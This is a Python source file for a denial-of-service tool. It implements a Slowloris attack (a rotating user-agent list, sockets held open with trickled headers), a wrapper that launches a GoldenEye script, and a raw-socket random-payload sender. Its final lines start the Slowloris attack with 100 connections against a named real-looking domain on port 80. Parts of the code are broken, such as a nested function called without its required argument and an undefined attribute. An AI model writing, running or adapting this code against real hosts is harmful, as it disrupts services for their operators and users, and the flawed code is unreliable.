import torch
import torch.nn as nn
import socket
import random
from random_string_generator import RandomStringGenerator
import logging
import subprocess
from urllib.parse import urlparse
import os


logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DoSAttack:
    def __init__(self):
        self.threads = []

    # def simulate_attack(self):
    #     for _ in range(self.num_connections):
    #         if self.attack_type == "Slowloris":
    #             self.slowloris_attack()
    #         elif self.attack_type == "Slowhttptest":
    #             thread = threading.Thread(target=self.slowhttptest_attack)
    #         elif self.attack_type == "Hulk":
    #             thread = threading.Thread(target=self.hulk_attack)
    #         elif self.attack_type == "GoldenEye":
    #             thread = threading.Thread(target=self.goldeneye_attack)
    #         else:
    #             thread = threading.Thread(target=self.create_connection)

    #         self.threads.append(thread)
    #         thread.start()

    def create_connection(self, url, target_port, model=RandomStringGenerator(100)):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            parsed_url = urlparse(url)
            hostname = parsed_url.netloc
            ip = socket.gethostbyname(hostname)
            sock.connect((ip, target_port))
            payload = model(torch.tensor([])).encode()  # Generate payload
            sock.send(payload)
            logging.info(f"Payload sent: {payload}")
            sock.send(b"QUIT")
            sock.close()
        except Exception as e:
            logging.error(f"Exception occurred while creating a connection: {e}")

    def send_line(self, s, line):
        line = f"{line}\r\n"
        s.send(line.encode("utf-8"))

    def send_header(self, s, name, value):
        self.send_line(s, f"{name}: {value}")

    def slowloris_attack(self, num_connections, url, target_port):
        user_agents = [
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50"
                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101"
                " Firefox/49.0"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36"
                " (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14"
                " (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
            ),
            (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50"
                " (KHTML, like Gecko) Version/10.0 Safari/602.1.50"
            ),
            (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
            ),
            (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            (
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,"
                " like Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/54.0.2840.71 Safari/537.36"
            ),
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            (
                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like"
                " Gecko) Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
                " Chrome/53.0.2785.143 Safari/537.36"
            ),
            (
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101"
                " Firefox/49.0"
            ),
        ]
        list_of_sockets = []

        def init_socket(ip: str):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, target_port))
            self.send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
            ua = random.choice(user_agents)
            self.send_header(s, "User-Agent", ua)
            self.send_header(s, "Accept-language", "en-US,en,q=0.5")
            return s

        def slowloris_iteration(self):
            logging.info("Sending keep-alive headers...")
            logging.info("Socket count: %s", len(list_of_sockets))

            # Try to send a header line to each socket
            for s in list(list_of_sockets):
                try:
                    self.send_header(s, "X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s)

            # Some of the sockets may have been closed due to errors or timeouts.
            # Re-create new sockets to replace them until we reach the desired number.

            diff = num_connections - len(list_of_sockets)
            if diff <= 0:
                return

            logging.info("Creating %s new sockets...", diff)
            for _ in range(diff):
                try:
                    parsed_url = urlparse(url)
                    hostname = parsed_url.netloc
                    s = init_socket(socket.gethostbyname(hostname))
                    if not s:
                        continue
                    list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug("Failed to create new socket: %s", e)
                    break

        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        ip = socket.gethostbyname(hostname)
        socket_count = num_connections
        logging.info("Attacking %s with %s sockets.", ip, socket_count)
        for _ in range(socket_count):
            try:
                logging.debug("Creating socket nr %s", _)
                s = init_socket(ip)
            except socket.error as e:
                logging.debug(e)
                break
            list_of_sockets.append(s)

        while True:
            try:
                slowloris_iteration()
            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping Slowloris")
                break
            except Exception as e:
                logging.debug("Error in Slowloris iteration: %s", e)

    def slowhttptest_attack(self):
        raise NotImplementedError

    def hulk_attack(self):
        raise NotImplementedError

    def goldeneye_attack(self, url, num_connections):
        logging.info("Attacking %s with GoldenEye...", url)
        path = os.path.join(os.path.dirname(__file__), "goldeneye.py")
        command = ["python3", path, self.url, "-w", str(num_connections)]
        subprocess.run(command)

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


dos = DoSAttack()  # target_url, num_connections, attack_type
# dos.simulate_attack()

dos.slowloris_attack(num_connections=100, url="https://panthon.app", target_port=80)
dos.wait_for_threads()
